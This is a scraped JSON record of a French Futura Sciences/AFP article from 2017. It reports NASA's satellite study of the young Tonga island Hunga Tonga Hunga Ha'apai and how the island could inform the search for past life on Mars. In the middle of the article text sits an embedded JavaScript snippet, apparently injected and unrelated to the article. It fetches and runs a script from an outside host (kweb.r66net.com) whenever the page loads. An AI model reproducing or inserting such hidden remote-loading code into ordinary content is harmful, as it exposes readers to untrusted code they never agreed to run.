{"title": "La plus jeune ile du monde nous aidera-t-elle a chercher la vie sur Mars ?", "newspaper": "Futura Sciences", "author": ["Par Futura avec l'AFP"], "date_publi": "2017-12-14", "content": "La plus jeune ile au monde, apparue dans l'archipel des Tonga a la faveur d'une eruption volcanique il y a trois ans, pourrait offrir des pistes pour comprendre le developpement potentiel de la vie sur Mars, a annonce la Nasa. L'ile de Hunga Tonga Hunga Ha'apai a emerge lors d'une eruption fin 2014-debut 2015 a environ 65 kilometres au nord-ouest de Nuku'alofa, la capitale de l' archipel  des Tonga. Voir aussi : Une nouvelle ile volcanique a vu le jour au Japon Les scientifiques avaient initialement anticipe que cette ile, produit de l'expulsion d'enormes  volumes  de roches et de cendres volcaniques, disparaitrait en quelques mois. Mais l'ile qui mesurait initialement un kilometre de large sur deux de long, et culminait a 120 metres, a beaucoup mieux resiste que prevu. Peut-etre grace a la consolidation des debris volcaniques en une roche appelee  tuf  volcanique. Et une nouvelle etude de la Nasa, qui a observe en continu par satellite l'evolution  physique  de l'ile depuis sa naissance (voir video ci-dessous), lui prete desormais une  esperance de vie  entre six et 30 ans. Reconstitution a partir d'images satellites et de modelisation 3D de l'evolution de l'ile Hunga Tonga Hunga Ha'apai sur 33 mois. (c) Nasa GSFC,  Scientific Visualization Studio , Cindy Starr, Damien Grouille, Cecile Sabau Etudier le cycle de la vie des iles nouvelles sur Terre et... sur Mars  Pour Jim Garvin, chercheur a la Nasa, il y a la une opportunite tres rare d'etudier le cycle de la vie sur les nouvelles iles. Il a releve que la planete Mars possedait de nombreuses anciennes  iles volcaniques  similaires qui etaient vraisemblablement entourees d'eau au moment de leur apparition.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le scientifique explique que ces anciennes iles volcaniques sont des lieux particulierement interessants quand il s'agit de rechercher des traces de vie passees car elles ont pu etre un terreau fertile en ce qu'elles cumulaient  chaleur  et humidite. Observer comment la vie colonise Hunga Tonga Hunga Ha'apai peut par consequent aider les scientifiques a comprendre ou chercher sur Mars des  traces de vie , insiste Jim Garvin. << Tout ce que nous apprenons sur ce que nous voyons sur Mars est base sur l'experience de l'interpretation des phenomenes terrestres , a-t-il declare dans le  communique de la Nasa .  Nous pensons qu'il y a eu des eruptions sur Mars a une epoque ou il y avait des zones d'eau persistantes en surface. Nous pourrions utiliser cette nouvelle ile des Tonga et son evolution pour tester si l'un de ceux-ci representait un environnement oceanique ou un lac ephemere. >>  Ces environnements qui furent humides et chauds pourraient donc etre des cibles privilegiees pour la recherche de traces de vie passes sur Mars. Dans quelques mois, le site d'investigation du futur  rover   Mars 2020  qui recherchera d'eventuelles signatures biologiques sur la Planete rouge a partir de 2021 sera connu. Voir aussi : ExoMars 2020 : detecter des traces de vie sur la Planete rouge ne sera pas facile Les iles Tonga, un royaume de quelque 170 iles qui compte environ 120.000 habitants, sont situees sur la <<  ceinture de feu  >> du Pacifique, ou les plaques continentales se rencontrent, causant une activite sismique et volcanique intense. Cela vous interessera aussi La mission ExoMars entame sa quete de vie martienne                       Y-a-t-il de la vie sur Mars ? La mission ExoMars devrait bientot repondre a cette question. Partie il y a peu pour la Planete rouge, la sonde de l'Agence spatiale europeenne (Esa) arrivera en octobre 2016 a destination. La chaine Euronews nous parle de son voyage et de ses objectifs dans ce nouvel episode de Space.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  vie sur mars -elle possible  |  en combien de temps terre tourne elle sur elle meme  |  lune tourne elle sur elle meme  |  jeune pie  |  jeune garcon  |  jeune moineau  |  chercher quelqu sur internet", "theme": "sciences"}